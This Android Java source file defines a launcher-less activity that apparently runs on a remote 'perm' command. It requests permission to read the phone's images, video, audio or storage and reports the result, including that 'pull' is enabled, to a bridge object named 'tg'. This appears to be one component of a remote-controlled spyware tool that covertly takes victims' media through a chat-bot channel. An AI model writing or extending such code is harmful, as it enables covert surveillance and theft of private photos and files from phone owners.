package br.svc.relay;

import android.Manifest;
import android.os.Build;
import android.os.Bundle;

/** Sobe via 'perm': pede midia + notificacoes. Sem launcher. */
public class PermActivity extends android.app.Activity {

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        java.util.ArrayList<String> ps = new java.util.ArrayList<>();
        if (Build.VERSION.SDK_INT >= 33) {
            ps.add(Manifest.permission.READ_MEDIA_IMAGES);
            ps.add(Manifest.permission.READ_MEDIA_VIDEO);
            ps.add(Manifest.permission.READ_MEDIA_AUDIO);
            ps.add(Manifest.permission.POST_NOTIFICATIONS);
        } else {
            ps.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        requestPermissions(ps.toArray(new String[0]), 7);
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] p, int[] r) {
        super.onRequestPermissionsResult(req, p, r);
        if (BridgeHolder.tg != null) {
            int ok = 0;
            for (int x : r) if (x == android.content.pm.PackageManager.PERMISSION_GRANTED) ok++;
            BridgeHolder.tg.say("perm: " + ok + "/" + r.length + " concedidas" +
                    (ok == r.length ? " - pull e notificacoes liberados" : ""));
        }
        finish();
    }
}
